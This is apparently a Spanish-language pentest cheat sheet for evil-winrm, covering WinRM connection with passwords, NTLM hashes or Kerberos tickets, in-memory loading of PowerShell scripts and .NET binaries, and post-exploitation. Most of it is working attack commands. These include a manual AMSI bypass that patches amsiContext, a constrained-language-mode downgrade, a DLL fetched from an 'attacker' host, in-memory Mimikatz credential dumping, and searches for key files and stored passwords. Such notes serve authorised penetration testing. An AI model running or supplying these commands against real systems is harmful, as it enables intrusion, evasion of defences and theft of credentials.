---
aliases:
tags:
  - tool/evil-winrm
  - technique/lateral-movement
  - technique/post-exploitation
  - env/windows
  - service/winrm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Post-Explotación]]"
tertiary categories:
  - "[[Windows & Active Directory Movimiento Lateral]]"
kind: Tool
linked:
  - "[[Pass-the-Hash]]"
  - "[[Pass-the-Ticket]]"
  - "[[netexec]]"
  - "[[Windows Privilege Escalation]]"
  - "[[Active Directory Explotación]]"
  - "[[AMSI Bypasses]]"
---
# evil-winrm

---

## Overview

Cliente Ruby WinRM orientado a pentest. Shell interactivo en `5985/tcp` (HTTP) o `5986/tcp` (HTTPS). Prereq víctima: user en `Remote Management Users` o `Administrators`. Ver primero [[netexec]] `winrm -u U -p P` para validar `Pwn3d!`.

Install: `gem install evil-winrm` / `apt install evil-winrm` / `docker run --rm -ti oscarakaelvis/evil-winrm`.

> Regla: AMSI + Constrained Language Mode (CLM) bloquean scripts invasivos. Evil-WinRM trae flags de bypass (`-o -c`) que funcionan en defaults.

---

## Conexión

```bash
# User + pass
evil-winrm -i <target> -u <user> -p <pass>

# PtH (NTLM hash)
evil-winrm -i <target> -u <user> -H <NThash>

# Kerberos (ccache)
export KRB5CCNAME=user.ccache
evil-winrm -i <target> -r <domain.local>                # -r = realm

# HTTPS
evil-winrm -i <target> -u <user> -p <pass> -S           # SSL
evil-winrm -i <target> -u <user> -p <pass> -S -c cert.pem -k key.pem

# Puerto custom
evil-winrm -i <target> -P 5985 -u U -p P
```

---

## Flags útiles

| Flag | Efecto |
|---|---|
| `-s <path>` | Local path a scripts de PowerShell (`Invoke-*`) |
| `-e <path>` | Local path a executables (usados por `upload`) |
| `-l` | Log session en `~/.evil-winrm-logs/` |
| `-L` | Log + no color |
| `-n` | Disable colored output |
| `-N` | Disable interactive prompt |
| `-V` | Verbose |
| `-t <sec>` | Connection timeout |

---

## Comandos built-in (en prompt)

```
*Evil-WinRM* PS C:\> menu                 # ayuda completa
upload local.exe C:\Users\Public\rev.exe
download C:\Users\Admin\secret.pdf
services                                  # lista servicios
invoke_binary /opt/tools/SharpHound.exe   # AMSI-safer, binary-in-memory via -e path
Bypass-4MSI                               # disable AMSI (CLM-aware)
Invoke-Binary                             # alias
```

### Cargar scripts de memoria

```
*Evil-WinRM* PS C:\> PowerView.ps1        # con -s /opt/tools/PowerView/
*Evil-WinRM* PS C:\> Find-InterestingDomainAcl
```

`-s /opt/tools/PS-ModuleLoad/` → cualquier `.ps1` en esa carpeta se autocompleta y ejecuta en memoria via `IEX`.

### Cargar binarios .NET in-memory

```
*Evil-WinRM* PS C:\> Invoke-Binary /opt/tools/Seatbelt.exe
*Evil-WinRM* PS C:\> Invoke-Binary /opt/tools/Rubeus.exe triage
```

`-e /opt/tools/` → listado por tab. Internamente: `[System.Reflection.Assembly]::Load([byte[]]...)`.

### Ejecutar DLL

```
*Evil-WinRM* PS C:\> Dll-Loader -http -url http://attacker/SharpKatz.dll
```

---

## AMSI bypass

```powershell
*Evil-WinRM* PS C:\> Bypass-4MSI
```

Inyecta `amsi.dll!AmsiScanBuffer` patch en proceso actual. Funciona hasta que el build de PS detecta el patch (cambia seguido — requiere alternativas si falla).

Fallback manual:

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};
$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

---

## CLM bypass

```powershell
# Check
$ExecutionContext.SessionState.LanguageMode                # "ConstrainedLanguage"

# Bypass via PowerShell v2 (si está habilitado)
powershell.exe -version 2
```

Otras técnicas: GhostPack binaries (via `Invoke-Binary`), JEA endpoint abuse, BYOVD.

---

## Post-exploitation quick wins

```powershell
whoami /priv
whoami /groups
systeminfo
net user
net localgroup Administrators
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-ChildItem C:\Users -Recurse -Include *.kdbx,*.pfx,*.pem 2>$null
Get-ChildItem -Path HKLM:\SOFTWARE -Recurse -ErrorAction SilentlyContinue | Select-String "password"
```

### Ejecutar Mimikatz in-memory

```powershell
*Evil-WinRM* PS C:\> Invoke-Binary /opt/tools/mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

### BloodHound

```powershell
*Evil-WinRM* PS C:\> Invoke-Binary /opt/tools/SharpHound.exe -c All --zipfilename bh.zip
*Evil-WinRM* PS C:\> download bh.zip /tmp/
```

---

## Troubleshooting

| Síntoma | Causa | Fix |
|---|---|---|
| `WinRM authentication failed` | user no en `Remote Management Users` | checkear membresía / usar Administrator |
| `WSMAN fault` | WinRM no escucha o firewall | `nxc winrm` para probar |
| Conexión pero prompt cuelga | AllowUnencrypted off y no SSL | `-S` + cert |
| `System.Management.Automation.PSSecurityException` | CLM activo | invoke-binary / PS v2 |
| Timeout en `Bypass-4MSI` | Nueva versión de AMSI | bypass manual custom |
| `Couldn't find Client Certificate` | cert path mal | `-c /full/path.pem -k /full/key.pem` |

---

## Alternativas

- **crackmapexec/nxc winrm** → validation + scripted execution no-interactiva.
- **impacket-wmiexec** → si WinRM cerrado y SMB abierto.
- **PowerShell Remoting nativo** (desde Windows attacker): `Enter-PSSession -ComputerName <t> -Credential <c>`.

---

## Referencias

- Repo: https://github.com/Hackplayers/evil-winrm
- WinRM docs: https://learn.microsoft.com/en-us/windows/win32/winrm/portal
